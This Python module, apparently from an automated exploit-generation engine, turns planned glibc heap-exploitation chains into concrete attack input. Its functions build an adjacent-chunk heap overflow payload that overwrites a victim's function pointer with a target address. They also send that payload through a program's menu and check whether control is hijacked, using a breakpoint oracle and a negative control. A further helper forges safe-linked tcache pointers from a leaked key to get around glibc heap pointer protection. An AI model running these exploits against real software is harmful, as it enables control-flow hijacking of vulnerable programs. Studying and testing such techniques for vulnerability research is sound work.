"""Heap grooming solver -> concrete, detonatable exploit input (doc 58).

lykos already MODELS heap layout (`heap.TcacheModel` -- a glibc tcache/fastbin simulator that
predicts reuse order) and PLANS exploitation chains (`aaheg.plan_exploit` -- full tcache-poisoning
op-chains). The last gap was that a planned chain was only ever filed as an L2 *recipe* ("here is the
chain; live hijack not demonstrated"): nothing LOWERED the plan to the concrete bytes that drive it
over the target's own menu, so nothing could DETONATE it. This module closes that gap, so a computed
groom becomes a demonstrated, poc-backed exploit.

Honesty contract (0-false-confirmation, same bar as the rest of the engine):
  * This module only COMPUTES input bytes -- it never decides a finding is confirmed. Proof is
    always a separate, forgery-proof execution oracle (`detonate.reaches_address`: an INT3 planted
    at win's address fires ONLY if the CPU actually transferred control there) paired with a
    NEGATIVE control (the same groom minus the control-flow overwrite must NOT reach win). A plan
    that lowers cleanly but does not detonate stays a recipe; it is never upgraded on the strength
    of the bytes looking right.

First technique lowered: **adjacent-chunk heap overflow -> function-pointer overwrite** -- the most
fundamental grooming primitive, and deliberately the one that needs NO leak and NO safe-linking
defeat. A linear overflow out of one heap chunk writes into the NEXT same-arena chunk's inline
function pointer; the groom is just the allocation order that places the two chunks adjacent. Two
consecutive fresh allocations come off the top of the arena in ascending order, so the victim's user
data sits exactly `request2size(overflow_chunk_request)` bytes after the overflow buffer's -- a
distance `TcacheModel` confirms and this module computes. Because win is reached with a single static
payload (no runtime-leaked value feeds the bytes), the plain `reaches_address` oracle confirms it;
no two-stage leak oracle is needed. (The leak-dependent techniques -- safe-linked tcache poisoning,
fastbin dup -- are the next lowerings; their groom is already modelled, they add a heap-leak stage.)
"""
from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import Callable, Optional

from .heap import TcacheModel, request2size

_p64 = lambda v: struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


@dataclass
class MenuSpec:
    """How to encode one heap operation as input bytes for THIS target's menu. A target exposes
    alloc / overflowing-write / call-the-pointer through its own command protocol; these callables
    (supplied by the op-model discovery, or hand-written for a fixture) turn an abstract op into the
    bytes that drive it. `alloc` takes the requested size, `edit` the slot's raw overflow bytes,
    `trigger` nothing -- the solver assigns slots implicitly by allocation order (slot 0 = the
    overflow buffer, slot 1 = the victim object), matching how these menus index their own table."""
    alloc_buf: Callable[[int], bytes]       # request a `size`-byte buffer (becomes slot 0)
    alloc_obj: Callable[[], bytes]          # allocate the victim object with the callable pointer (slot 1)
    edit_buf: Callable[[bytes], bytes]      # write raw bytes into slot 0 (the overflow primitive)
    trigger: Callable[[], bytes]            # cause the program to CALL slot 1's function pointer


@dataclass
class AdjacentOverflowPlan:
    """A lowered adjacent-overflow groom: the exact overflow distance, the op sequence, and the
    positive/negative payloads. `overflow_distance` is bytes from the overflow buffer's user data to
    the victim's function pointer; `payload` fills to it then overwrites the pointer with `win_addr`;
    `negative_payload` fills right up to -- but not over -- the pointer, so it must NOT reach win."""
    overflow_distance: int
    win_addr: int
    buf_request: int
    obj_fptr_off: int
    payload: bytes
    negative_payload: bytes


def plan_adjacent_overflow(buf_request: int, win_addr: int, *, obj_fptr_off: int = 0,
                           fill: bytes = b"A") -> AdjacentOverflowPlan:
    """Compute the groom + payload to overwrite an adjacent victim chunk's function pointer with
    `win_addr` via a linear overflow out of a `buf_request`-byte buffer.

    The victim object is allocated immediately after the overflow buffer, so (both coming off the
    arena top) its user data is `request2size(buf_request)` bytes past the buffer's; the function
    pointer sits `obj_fptr_off` into it. We PROVE that distance with `TcacheModel` (no frees between
    the two allocations -> ascending top allocation -> adjacency) rather than asserting it.
    """
    if buf_request <= 0:
        raise ValueError("buf_request must be positive")
    chunk = request2size(buf_request)
    distance = chunk + obj_fptr_off

    # Prove adjacency with the allocator model: two fresh allocations, no intervening free, so the
    # victim's user data lands exactly `chunk` bytes after the buffer's.
    m = TcacheModel()
    buf_ptr = m.malloc(buf_request)
    obj_ptr = m.malloc(max(buf_request, 1))
    assert obj_ptr - buf_ptr == chunk, (
        f"adjacency model mismatch: {obj_ptr - buf_ptr:#x} != chunk {chunk:#x}")

    payload = (fill * distance)[:distance] + _p64(win_addr)
    # The negative control reaches the SAME code path (same groom, same trigger) but stops one word
    # short of the pointer -- so if it still reaches win, the "hit" was not our overwrite and the
    # positive result must be rejected.
    negative_payload = (fill * distance)[:distance]
    return AdjacentOverflowPlan(overflow_distance=distance, win_addr=win_addr,
                                buf_request=buf_request, obj_fptr_off=obj_fptr_off,
                                payload=payload, negative_payload=negative_payload)


def lower(plan: AdjacentOverflowPlan, spec: MenuSpec, *, negative: bool = False) -> bytes:
    """Lower an adjacent-overflow plan to the single input stream that drives it over the menu:
    allocate the overflow buffer (slot 0), allocate the victim object (slot 1), overflow out of
    slot 0 into slot 1's function pointer, then trigger the call. `negative=True` emits the
    negative-control stream (the short overflow) for the paired oracle check."""
    data = plan.negative_payload if negative else plan.payload
    return b"".join((
        spec.alloc_buf(plan.buf_request),
        spec.alloc_obj(),
        spec.edit_buf(data),
        spec.trigger(),
    ))


def detonate_adjacent_overflow(exe: str, plan: AdjacentOverflowPlan, spec: MenuSpec, *,
                               input_mode: str = "stdin", argv: Optional[list] = None,
                               timeout: float = 8.0) -> bool:
    """Drive the lowered groom at `exe` and CONFIRM control reaches `win_addr` via an INT3 oracle,
    with the negative control required to FAIL. Sound: returns True only when the real overflow
    hijacks the pointer AND the short overflow does not -- so a target that reaches win on its own
    (or via anything but our overwrite) is rejected. Never raises; False on any doubt.

    `win_addr` must be the RUNTIME address of the win function -- a file vaddr for a non-PIE target
    (the no-leak case this first technique targets). A PIE target needs a base leak first and is not
    handled here."""
    from . import detonate
    pos = lower(plan, spec, negative=False)
    if not detonate.reaches_address(exe, pos, plan.win_addr, input_mode=input_mode,
                                    argv=argv, timeout=timeout):
        return False
    neg = lower(plan, spec, negative=True)
    if detonate.reaches_address(exe, neg, plan.win_addr, input_mode=input_mode,
                                argv=argv, timeout=timeout):
        return False                                     # negative control reached win -> not sound
    return True


# ----------------------------------------------------------- leak-consuming safe-linked tcache poison
def forge_safelink_fd(leaked_fd: int, target: int) -> int:
    """The fd value to write back into a freed tcache chunk so the allocator hands out `target`
    next, computed from the heap key the chunk's OWN fd disclosed -- the leak-dependent lowering
    that makes a safe-linking (glibc >= 2.32) tcache poison ASLR-robust instead of relying on a
    traced constant.

    Safe-linking stores `mangle(addr, next) = (addr >> 12) ^ next` in a freed chunk's fd. A chunk
    freed ALONE into a tcache bin has `next == NULL`, so its fd reads back as `(addr >> 12) ^ 0 ==
    addr >> 12` -- the exact page-shifted key safe-linking XORs with. A use-after-free VIEW of that
    chunk therefore discloses the key directly, with no knowledge of the chunk's full address. To
    forge a pointer to `target`, write `leaked_fd ^ target`: the allocator demangles it as
    `(addr >> 12) ^ (leaked_fd ^ target) == (addr >> 12) ^ ((addr >> 12) ^ target) == target`, so
    the next-but-one malloc returns a chunk AT `target`. The caller supplies `leaked_fd` from a
    live in-process leak, so the key is the running process's own -- a real heap-ASLR defeat.

    `target` must be 16-aligned: glibc 2.32+ rejects an unaligned tcache chunk (`_writable_globals`
    already filters to aligned fn-pointer slots)."""
    return (leaked_fd ^ target) & 0xFFFFFFFFFFFFFFFF


def is_plausible_heap_key(value: int) -> bool:
    """Whether `value` could be a safe-linking key (a user-space heap address >> 12). A heap chunk
    sits somewhere under the 47-bit user-space ceiling, so its page-shifted form is a positive
    value below 2**36 and above a page -- used to pick the fd out of a leak's numeric noise. A loose
    gate on purpose (a non-PIE brk heap shifts to a small key, e.g. 0x414 with ASLR off): the
    execution oracle, not this filter, is what rejects a wrong guess."""
    return 0x100 <= value < (1 << 36)
